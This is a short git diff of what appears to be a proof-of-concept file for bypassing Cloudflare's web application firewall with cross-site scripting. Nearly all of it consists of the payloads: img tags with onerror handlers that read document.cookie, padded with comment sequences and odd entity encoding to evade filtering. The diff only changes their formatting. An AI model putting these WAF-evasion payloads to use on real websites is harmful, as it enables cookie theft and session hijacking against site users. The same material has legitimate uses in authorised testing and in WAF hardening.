@@ -7,6 +7,6 @@ Payload:
 ```
 
 XSS Bypass Waf Cloudflare ;) Poc 
-```
-"/***/&gt;/***/<img onerror="alert(document.cookie)/***/" src="P"/> "/**/>/**/<img src=P onerror=alert&#0000000040document.cookie)/**/> "&gt;00%00%00<img onerror="alert(document.cookie)" src="P"/>00%00
-```
+"/***/&gt;/***/<img onerror="alert(document.cookie)/***/" src="P"/> 
+"/**/>/**/<img src=P onerror=alert&#0000000040document.cookie)/**/> "
+&gt;00%00%00<img onerror="alert(document.cookie)" src="P"/>00%00
